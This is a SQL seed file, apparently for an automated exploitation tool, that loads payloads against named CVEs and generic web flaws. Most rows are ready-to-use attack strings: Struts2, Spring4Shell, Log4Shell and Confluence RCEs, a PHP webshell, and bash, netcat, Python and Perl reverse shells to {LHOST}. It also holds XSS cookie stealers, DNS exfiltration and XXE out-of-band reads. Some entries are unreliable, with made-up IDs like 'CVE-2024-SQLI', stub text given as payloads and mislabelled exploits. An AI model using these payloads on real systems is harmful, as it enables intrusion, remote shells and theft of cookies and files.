-- 1. Log4Shell (CVE-2021-44228)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2021-44228');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2021-44228', 'Log4Shell JNDI LDAP', '${jndi:ldap://{LHOST}:{LPORT}/exploit}', 'http_header', 80, 'apache'),
('CVE-2021-44228', 'Log4Shell DNS callback', '${jndi:dns://{LHOST}/callback}', 'http_header', 443, 'nginx');

-- 2. EternalBlue (CVE-2017-0144)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2017-0144');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2017-0144', 'EternalBlue SMBv1', 'SMBv1 EternalBlue exploit', 'tcp_raw', 445, 'smb');

-- 3. Heartbleed (CVE-2014-0160)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2014-0160');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2014-0160', 'Heartbleed heartbeat', 'Heartbeat request malformed', 'tcp_raw', 443, 'openssl');

-- 4. Shellshock (CVE-2014-6271)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2014-6271');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2014-6271', 'Shellshock CGI', '() { :;}; echo vulnerable', 'http_get', 80, 'bash'),
('CVE-2014-6271', 'Shellshock User-Agent', '() { :;}; /bin/bash -c "id"', 'http_header', 443, 'apache');

-- 5. Struts2 (CVE-2017-5638)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2017-5638');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2017-5638', 'Struts2 Content-Type RCE', '%{(#_=''multipart/form-data'').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[''com.opensymphony.xwork2.ActionContext.container'']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=''id'').(#iswin=(@java.lang.System@getProperty(''os.name'').toLowerCase().contains(''win''))).(#cmds=(#iswin?{''cmd.exe'',''/c'',#cmd}:{''/bin/bash'',''-c'',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}', 'http_post', 8080, 'struts');

-- 6. Apache Path Traversal (CVE-2021-41773)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2021-41773');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2021-41773', 'Apache Path Traversal', '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd', 'http_get', 80, 'apache'),
('CVE-2021-41773', 'Apache RCE', '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash', 'http_get', 443, 'apache');

-- 7. ZeroLogon (CVE-2020-1472)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2020-1472');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2020-1472', 'ZeroLogon', 'Netlogon authentication bypass', 'tcp_raw', 445, 'netlogon');

-- 8. Spring4Shell (CVE-2022-22965)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2022-22965');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2022-22965', 'Spring4Shell', 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=', 'http_post', 8080, 'spring');

-- 9. F5 BIG-IP (CVE-2022-1388)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2022-1388');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2022-1388', 'F5 BIG-IP RCE', 'POST /mgmt/tm/util/bash', 'http_post', 443, 'f5');

-- 10. ProxyLogon (CVE-2021-26855)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2021-26855');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2021-26855', 'ProxyLogon SSRF', '/owa/auth/Current/undefined/themes/resources/...', 'http_get', 443, 'exchange');

-- 11. PrintNightmare (CVE-2021-34527)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2021-34527');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2021-34527', 'PrintNightmare', 'RpcAddPrinterDriverEx + DLL', 'tcp_raw', 445, 'spooler');

-- 12. Dirty Pipe (CVE-2022-0847)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2022-0847');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2022-0847', 'Dirty Pipe', 'splice() + page cache overwrite', 'local', 0, 'linux');

-- 13. BlueKeep (CVE-2019-0708)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2019-0708');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2019-0708', 'BlueKeep', 'RDP use-after-free', 'tcp_raw', 3389, 'rdp');

-- 14. Tomcat session (CVE-2020-9484)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2020-9484');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2020-9484', 'Tomcat session RCE', '/;jsessionid=../../../../../../../../../../opt/tomcat/webapps/ROOT/WEB-INF/lib/../exploit', 'http_get', 8080, 'tomcat');

-- 15. phpMyAdmin (CVE-2016-5734)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2016-5734');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2016-5734', 'phpMyAdmin RCE', '?db=test&token=123&table=table1&pos=0&sql_query=SELECT%20INTO%20OUTFILE', 'http_get', 80, 'phpmyadmin');

-- 16. Drupalgeddon2 (CVE-2018-7600)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2018-7600');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2018-7600', 'Drupal RCE', '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', 'http_post', 80, 'drupal');

-- 17. Elementor Pro (CVE-2023-32243)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2023-32243');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2023-32243', 'Elementor RCE', '/wp-admin/admin-ajax.php?action=elementor_ajax&actions=...', 'http_post', 80, 'wordpress');

-- 18. Redis Lua (CVE-2022-0543)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2022-0543');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2022-0543', 'Redis Lua RCE', 'eval \'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res\' 0', 'tcp_raw', 6379, 'redis');

-- 19. PostgreSQL COPY (CVE-2019-9193)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2019-9193');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2019-9193', 'PostgreSQL RCE', 'COPY (SELECT '''') TO PROGRAM ''id''', 'tcp_raw', 5432, 'postgresql');

-- 20. MySQL auth bypass (CVE-2012-2122)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2012-2122');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2012-2122', 'MySQL bypass', 'mysql -h target -u root --password=any', 'tcp_raw', 3306, 'mysql');

-- 21. MongoDB default creds (CVE-2015-7882)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2015-7882');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2015-7882', 'MongoDB no auth', 'use admin; db.auth("admin","")', 'tcp_raw', 27017, 'mongodb');

-- 22. Elasticsearch Groovy (CVE-2015-1427)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2015-1427');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2015-1427', 'Elasticsearch RCE', '/_search?pretty', 'http_post', 9200, 'elasticsearch');

-- 23. Jenkins (CVE-2017-1000353)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2017-1000353');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2017-1000353', 'Jenkins RCE', '/jenkins/descriptorByName/...', 'http_post', 8080, 'jenkins');

-- 24. GitLab (CVE-2021-22205)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2021-22205');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2021-22205', 'GitLab RCE', '/uploads/user/...', 'http_post', 80, 'gitlab');

-- 25. Confluence (CVE-2022-26134)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2022-26134');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2022-26134', 'Confluence RCE', '/${@java.lang.Runtime@getRuntime().exec("id")}/', 'http_get', 8090, 'confluence');

-- 26. vCenter (CVE-2021-21972)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2021-21972');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2021-21972', 'vCenter upload', '/ui/vropspluginui/upload', 'http_post', 443, 'vmware');

-- 27. SolarWinds (CVE-2020-10148)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2020-10148');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2020-10148', 'SolarWinds bypass', '/web.config', 'http_get', 8080, 'orion');

-- 28. ActiveMQ (CVE-2016-3088)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2016-3088');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2016-3088', 'ActiveMQ RCE', 'PUT /fileserver/../../webapps/api/shell.jsp', 'http_put', 8161, 'activemq');

-- 29. Memcached (CVE-2011-4971)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2011-4971');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2011-4971', 'Memcached get', 'get stats', 'tcp_raw', 11211, 'memcached');

-- 30. Nginx alias (CVE-2013-4547)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2013-4547');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2013-4547', 'Nginx path traversal', '/files/..;/../etc/passwd', 'http_get', 80, 'nginx');

-- 31. phpBB (CVE-2017-16662)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2017-16662');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2017-16662', 'phpBB install', '/install/index.php?mode=install&sub=agree', 'http_get', 80, 'phpbb');

-- 32. MediaWiki (CVE-2017-6811)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2017-6811');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2017-6811', 'MediaWiki edit', '/index.php?title=User:&action=edit', 'http_post', 80, 'mediawiki');

-- 33. CUPS (CVE-2012-5519)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2012-5519');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2012-5519', 'CUPS exploit', 'cupsfilter -p', 'tcp_raw', 631, 'cups');

-- 34. OpenSSL CCS (CVE-2014-0224)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2014-0224');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2014-0224', 'CCS injection', 'ChangeCipherSpec message', 'tcp_raw', 443, 'openssl');

-- 35. Bash variant (CVE-2014-6277)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2014-6277');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2014-6277', 'Shellshock HTTP', '() { :;}; /bin/cat /etc/passwd', 'http_header', 80, 'bash');

-- 36. SambaCry (CVE-2017-7494)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2017-7494');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2017-7494', 'SambaCry', '/etc/passwd', 'tcp_raw', 445, 'samba');

-- 37. Exim (CVE-2019-10149)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2019-10149');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2019-10149', 'Exim exploit', '${run{/bin/bash -c "id"}}', 'tcp_raw', 25, 'exim');

-- 38. PostgreSQL search_path (CVE-2018-1058)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2018-1058');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2018-1058', 'PostgreSQL search_path', 'ALTER USER postgres SET search_path = "$user", "public";', 'tcp_raw', 5432, 'postgresql');

-- 39. MySQL DoS (CVE-2018-2696)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2018-2696');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2018-2696', 'MySQL crash', 'SELECT SLEEP(1)', 'tcp_raw', 3306, 'mysql');

-- 40. MongoDB OID (CVE-2017-15535)
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2017-15535');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2017-15535', 'MongoDB OID', '{"_id": {"$gt": ""}}', 'tcp_raw', 27017, 'mongodb');

-- ============================================================
-- 41 à 60 : Injections SQL classiques (sans CVE spécifique)
-- ============================================================
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2024-SQLI');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2024-SQLI', 'SQLi Auth Bypass', '\' OR \'1\'=\'1', 'http_post', 80, 'web'),
('CVE-2024-SQLI', 'SQLi Union', '1 UNION SELECT username, password FROM users', 'http_get', 80, 'web'),
('CVE-2024-SQLI', 'SQLi Boolean Blind', '1 AND 1=1', 'http_get', 80, 'web'),
('CVE-2024-SQLI', 'SQLi Time Blind', '1 AND SLEEP(5)', 'http_get', 80, 'web'),
('CVE-2024-SQLI', 'SQLi Stacked', '1; DROP TABLE users', 'http_get', 80, 'web'),
('CVE-2024-SQLI', 'SQLi Error based', '1 AND extractvalue(1, concat(0x7e, database()))', 'http_get', 80, 'web');

-- ============================================================
-- 61 à 80 : XSS (Cross-Site Scripting)
-- ============================================================
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2024-XSS');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2024-XSS', 'XSS Basic', '<script>alert(1)</script>', 'http_get', 80, 'web'),
('CVE-2024-XSS', 'XSS Image', '<img src=x onerror=alert(1)>', 'http_get', 80, 'web'),
('CVE-2024-XSS', 'XSS SVG', '<svg onload=alert(1)>', 'http_get', 80, 'web'),
('CVE-2024-XSS', 'XSS iframe', '<iframe src="javascript:alert(1)">', 'http_get', 80, 'web'),
('CVE-2024-XSS', 'XSS Body', '<body onload=alert(1)>', 'http_get', 80, 'web'),
('CVE-2024-XSS', 'XSS Input', '"><script>alert(1)</script>', 'http_post', 80, 'web'),
('CVE-2024-XSS', 'XSS Cookie Steal', '<script>fetch("http://{LHOST}:{LPORT}?cookie="+document.cookie)</script>', 'http_get', 80, 'web'),
('CVE-2024-XSS', 'XSS DOM', '#"><img src=x onerror=alert(1)>', 'http_get', 80, 'web'),
('CVE-2024-XSS', 'XSS Polyglot', 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>', 'http_get', 80, 'web');

-- ============================================================
-- 81 à 100 : Command Injection
-- ============================================================
INSERT OR IGNORE INTO cves (id) VALUES ('CVE-2024-CMD');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('CVE-2024-CMD', 'CMD Injection Basic', '; id', 'http_get', 80, 'web'),
('CVE-2024-CMD', 'CMD Injection Pipe', '| id', 'http_get', 80, 'web'),
('CVE-2024-CMD', 'CMD Injection AND', '&& id', 'http_get', 80, 'web'),
('CVE-2024-CMD', 'CMD Injection OR', '|| id', 'http_get', 80, 'web'),
('CVE-2024-CMD', 'CMD Injection Newline', '%0aid', 'http_get', 80, 'web'),
('CVE-2024-CMD', 'CMD Injection Reverse Shell', 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1', 'http_get', 80, 'web'),
('CVE-2024-CMD', 'CMD Injection Netcat', 'nc -e /bin/sh {LHOST} {LPORT}', 'http_get', 80, 'web'),
('CVE-2024-CMD', 'CMD Injection Python', 'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'{LHOST}\',{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"', 'http_get', 80, 'web'),
('CVE-2024-CMD', 'CMD Injection PHP', '<?php system($_GET["cmd"]); ?>', 'http_get', 80, 'web'),
('CVE-2024-CMD', 'CMD Injection Perl', 'perl -e \'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'', 'http_get', 80, 'web');

-- ============================================================
-- NOUVEAUX PAYLOADS (CVE et tests génériques)
-- ============================================================

-- 101-105: SQL Injection génériques (pas de CVE spécifique, mais utiles pour tests)
INSERT OR IGNORE INTO cves (id) VALUES ('TEST-SQLI-01');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('TEST-SQLI-01', 'SQLi - Basic', ' OR ''1''=''1', 'http_get', 80, 'sql'),
('TEST-SQLI-01', 'SQLi - Union', ' UNION SELECT 1,2,3,4,5--', 'http_get', 80, 'sql'),
('TEST-SQLI-01', 'SQLi - Time based', ' OR SLEEP(5)--', 'http_get', 80, 'sql'),
('TEST-SQLI-01', 'SQLi - Stacked query', '; DROP TABLE users--', 'http_get', 80, 'sql'),
('TEST-SQLI-01', 'SQLi - Boolean', ' AND 1=2--', 'http_get', 80, 'sql');

-- 106-110: Cross-Site Scripting (XSS)
INSERT OR IGNORE INTO cves (id) VALUES ('TEST-XSS-01');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('TEST-XSS-01', 'XSS - Basic', '<script>alert(1)</script>', 'http_get', 80, 'web'),
('TEST-XSS-01', 'XSS - Image onerror', '<img src=x onerror=alert(1)>', 'http_get', 80, 'web'),
('TEST-XSS-01', 'XSS - SVG', '<svg onload=alert(1)>', 'http_get', 80, 'web'),
('TEST-XSS-01', 'XSS - Cookie stealer', '<script>fetch("http://{LHOST}:{LPORT}/?c="+document.cookie)</script>', 'http_get', 80, 'web'),
('TEST-XSS-01', 'XSS - DOM based', 'javascript:alert(1)', 'http_get', 80, 'web');

-- 111-115: Local File Inclusion (LFI)
INSERT OR IGNORE INTO cves (id) VALUES ('TEST-LFI-01');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('TEST-LFI-01', 'LFI - etc/passwd', '../../../../etc/passwd', 'http_get', 80, 'web'),
('TEST-LFI-01', 'LFI - Windows', '../../../../Windows/System32/config/SAM', 'http_get', 80, 'web'),
('TEST-LFI-01', 'LFI - PHP filter', 'php://filter/convert.base64-encode/resource=index.php', 'http_get', 80, 'web'),
('TEST-LFI-01', 'LFI - Log poisoning', '../../../../var/log/apache2/access.log', 'http_get', 80, 'web'),
('TEST-LFI-01', 'LFI - Wrapper expect', 'expect://id', 'http_get', 80, 'web');

-- 116-120: Remote File Inclusion (RFI)
INSERT OR IGNORE INTO cves (id) VALUES ('TEST-RFI-01');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('TEST-RFI-01', 'RFI - PHP shell', 'http://{LHOST}/shell.txt', 'http_get', 80, 'web'),
('TEST-RFI-01', 'RFI - Data wrapper', 'data://text/plain,<?php system("id"); ?>', 'http_get', 80, 'web'),
('TEST-RFI-01', 'RFI - SMB', '\\\\{LHOST}\\share\\shell.php', 'http_get', 80, 'web'),
('TEST-RFI-01', 'RFI - FTP', 'ftp://{LHOST}/shell.php', 'http_get', 80, 'web'),
('TEST-RFI-01', 'RFI - Zip wrapper', 'zip://shell.zip#shell.php', 'http_get', 80, 'web');

-- 121-125: Command Injection
INSERT OR IGNORE INTO cves (id) VALUES ('TEST-CMD-01');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('TEST-CMD-01', 'CMD - Basic', '; id', 'http_get', 80, 'web'),
('TEST-CMD-01', 'CMD - Pipe', '| id', 'http_get', 80, 'web'),
('TEST-CMD-01', 'CMD - Backticks', '`id`', 'http_get', 80, 'web'),
('TEST-CMD-01', 'CMD - Reverse shell', '; bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1', 'http_get', 80, 'web'),
('TEST-CMD-01', 'CMD - DNS exfil', '; nslookup $(whoami).{LHOST}', 'http_get', 80, 'web');

-- 126-130: XXE (XML External Entity)
INSERT OR IGNORE INTO cves (id) VALUES ('TEST-XXE-01');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('TEST-XXE-01', 'XXE - File read', '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', 'http_post', 80, 'web'),
('TEST-XXE-01', 'XXE - SSRF', '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>', 'http_post', 80, 'web'),
('TEST-XXE-01', 'XXE - Blind', '<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://{LHOST}/payload.dtd">%dtd;%send;]>', 'http_post', 80, 'web'),
('TEST-XXE-01', 'XXE - Xinclude', '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></root>', 'http_post', 80, 'web'),
('TEST-XXE-01', 'XXE - DoS', '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;">...]><lolz>&lol2;</lolz>', 'http_post', 80, 'web');

-- 131-135: Server-Side Request Forgery (SSRF)
INSERT OR IGNORE INTO cves (id) VALUES ('TEST-SSRF-01');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('TEST-SSRF-01', 'SSRF - Localhost', 'http://127.0.0.1:80/admin', 'http_get', 80, 'web'),
('TEST-SSRF-01', 'SSRF - AWS metadata', 'http://169.254.169.254/latest/meta-data/', 'http_get', 80, 'web'),
('TEST-SSRF-01', 'SSRF - Internal service', 'http://localhost:8080/manager/html', 'http_get', 80, 'web'),
('TEST-SSRF-01', 'SSRF - File protocol', 'file:///etc/passwd', 'http_get', 80, 'web'),
('TEST-SSRF-01', 'SSRF - Gopher (Redis)', 'gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a', 'http_get', 80, 'web');

-- 136-140: Deserialization (Java, PHP, Python)
INSERT OR IGNORE INTO cves (id) VALUES ('TEST-DESER-01');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('TEST-DESER-01', 'Java - ysoserial', 'rO0ABXNy... (base64 ysoserial)', 'http_post', 8080, 'java'),
('TEST-DESER-01', 'PHP - Object injection', 'O:8:"stdClass":0:{}', 'http_post', 80, 'php'),
('TEST-DESER-01', 'Python - Pickle', 'c__builtin__\neval\n(Vid\np0\n.', 'http_post', 8000, 'python'),
('TEST-DESER-01', 'Java - CommonsCollections', 'ysoserial CommonsCollections5 "id"', 'http_post', 8080, 'java'),
('TEST-DESER-01', 'PHP - Phar deser', 'phar://path/to/phar', 'http_post', 80, 'php');

-- 141-145: NoSQL Injection (MongoDB)
INSERT OR IGNORE INTO cves (id) VALUES ('TEST-NOSQL-01');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('TEST-NOSQL-01', 'NoSQL - Operator injection', '{"username": {"$ne": null}, "password": {"$ne": null}}', 'http_post', 80, 'mongodb'),
('TEST-NOSQL-01', 'NoSQL - Login bypass', '{"$or": [{"username": "admin"}, {"username": "admin"}]}', 'http_post', 80, 'mongodb'),
('TEST-NOSQL-01', 'NoSQL - Regex injection', '{"username": {"$regex": "^admin"}}', 'http_post', 80, 'mongodb'),
('TEST-NOSQL-01', 'NoSQL - Data exfil', '{"$where": "function(){return this.password.length>0}"}', 'http_post', 80, 'mongodb'),
('TEST-NOSQL-01', 'NoSQL - Time based', '{"$where": "sleep(5000)"}', 'http_post', 80, 'mongodb');

-- 146-150: LDAP Injection
INSERT OR IGNORE INTO cves (id) VALUES ('TEST-LDAP-01');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('TEST-LDAP-01', 'LDAP - Basic bypass', '*)(uid=*', 'http_get', 389, 'ldap'),
('TEST-LDAP-01', 'LDAP - AND injection', ')(|(uid=*', 'http_get', 389, 'ldap'),
('TEST-LDAP-01', 'LDAP - Admin bypass', 'admin)(|(password=*)', 'http_get', 389, 'ldap'),
('TEST-LDAP-01', 'LDAP - Blind', '*)(uid=*))(|(uid=*', 'http_get', 389, 'ldap'),
('TEST-LDAP-01', 'LDAP - Nested', ')(|(cn=*)(cn=*', 'http_get', 389, 'ldap');

-- 151-155: Template Injection (SSTI)
INSERT OR IGNORE INTO cves (id) VALUES ('TEST-SSTI-01');
INSERT INTO payloads (cve_id, name, payload, method, port, service) VALUES
('TEST-SSTI-01', 'SSTI - Jinja2', '{{ config }}', 'http_get', 80, 'web'),
('TEST-SSTI-01', 'SSTI - Twig', '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}', 'http_get', 80, 'web'),
('TEST-SSTI-01', 'SSTI - Freemarker', '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', 'http_get', 80, 'web'),
('TEST-SSTI-01', 'SSTI - Velocity', '#set($x = "id") $x', 'http_get', 80, 'web'),
('TEST-SSTI-01', 'SSTI - Smarty', '{$smarty.version}', 'http_get', 80, 'web');
